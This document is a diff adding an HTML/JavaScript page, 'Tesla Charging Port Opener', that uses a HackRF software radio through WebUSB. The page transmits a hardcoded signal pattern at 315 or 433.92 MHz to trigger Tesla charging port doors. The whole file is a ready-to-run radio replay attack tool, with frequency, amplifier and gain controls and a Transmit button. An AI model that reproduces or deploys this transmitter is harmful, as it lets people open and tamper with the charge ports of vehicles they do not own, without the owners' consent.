@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Tesla Charging Port Opener</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+  <script src="https://code.jquery.com/jquery-2.0.3.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+  <script src="js/hackrf.js"></script>
+  <script>
+    "use strict";
+    let dev = null;
+    let sampleRate = 10000000;
+    let symbolRate = 2500;
+    let pattern = [0,0,0,0,0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1];
+
+    function makeTxCallback() {
+        let samplesPerBit = sampleRate/symbolRate;
+        let total = pattern.length * samplesPerBit;
+        console.log(`total=${total}`);
+        let offset = 0;
+        return function(length) {
+            console.log(`offset=${offset} lenght=${length}`);
+            if (offset < total) {
+                let buf = new Int8Array(length);
+                for (let i = 0; i < length/2; i++) {
+                    let ind = Math.floor(offset/samplesPerBit);
+                    if (ind < pattern.length) {
+                        buf[i*2] = (pattern[ind] == 0) ? 0 : 127;
+                    } else {
+                        buf[i*2] = 0;
+                    }
+                    buf[i*2+1] = 0;
+                    offset++;
+                }
+                //console.log(buf);
+                return buf;
+            } else {
+                return null;
+            }
+        }
+    }
+
+    function timeLog(msg) {
+        let d = new Date();
+        let h = d.getHours().toString().padStart(2, "0");
+        let m = d.getMinutes().toString().padStart(2, "0");
+        let s = d.getSeconds().toString().padStart(2, "0");
+        $('#txlog').append(`[${h}:${m}:${s}] ${msg}\n`);
+    }
+
+    async function onTx() {
+        let freq = $('input[name=optfreq]:checked', '#tesla-form').val()
+        let ampEnabled = $("#amp").prop('checked')
+        let gain = $("#gain").val();
+        let h = null;
+        if (!dev) {
+            dev = await HackRF.requestDevice();
+            if (!dev) {
+                timeLog("HackRF not found");
+                return;
+            } else {
+                h = new HackRF();
+                await h.open(dev);
+                let devVer = await h.readVersionString();
+                timeLog(`HackRF connected (ver. ${devVer})`);
+                navigator.usb.ondisconnect = event => {
+                    timeLog("HackRF disconnected");
+                    dev = null;
+                };
+            }
+        }
+        if (!h) {
+            h = new HackRF();
+            await h.open(dev);
+        }
+        await h.setAmpEnable(ampEnabled);
+        await h.setAntennaEnable(false);
+        await h.setFreq(freq);
+        await h.setSampleRateManual(sampleRate, 1);
+        await h.setTxVgaGain(gain);
+        let txCallback = makeTxCallback();
+        timeLog(`Transmit...`);
+        await h.startTx(txCallback);
+    }
+
+    $(document).ready(function() {
+        $("#btnTx").click(onTx);
+    });
+  </script>
+</head>
+<body>
+<div class="container">
+    <div class="row">
+        <h3>Tesla Charging Port Opener</h3>
+    </div>
+
+    <div id="tesla-form" class="form-horizontal">
+        <div class="form-group">
+            <label class="control-label col-sm-2">Frequency:</label>
+            <div class="col-sm-4">
+                <div class="radio">
+                    <label><input type="radio" name="optfreq" value="315000000" checked>315.000 MHz</label>
+                </div>
+                <div class="radio">
+                    <label><input type="radio" name="optfreq" value="433920000">433.920 MHz</label>
+                </div>
+            </div>
+        </div>
+        <div class="form-group">
+            <label class="control-label col-sm-2" for="amp">Amplifier:</label>
+            <div class="col-sm-4 checkbox">
+                <label><input type="checkbox" id="amp">Enable</label>
+            </div>
+        </div>
+        <div class="form-group">
+            <label class="control-label col-sm-2" for="gain">TX gain:</label>
+            <div class="col-sm-4">
+                <input type="range" id="gain" style="margin-top: 6px;" min="1" max="47">
+            </div>
+        </div>
+        <div class="form-group">
+            <div class="col-sm-offset-2 col-sm-10">
+              <button type="submit" id="btnTx" class="btn btn-large btn-danger">Transmit</button>
+            </div>
+        </div>
+        <div class="form-group">
+            <label class="control-label col-sm-2" for="txlog">Log:</label>
+            <div class="col-sm-6">
+                <textarea class="form-control" style="font-family: monospace;" rows="8" id="txlog" disabled></textarea>
+            </div>
+        </div>
+    </div>
+    <div class="footer">v1.0 (<a href="https://github.com/rgerganov/tesla-opener">source</a>)</div>
+</div>
+</body>
+</html>
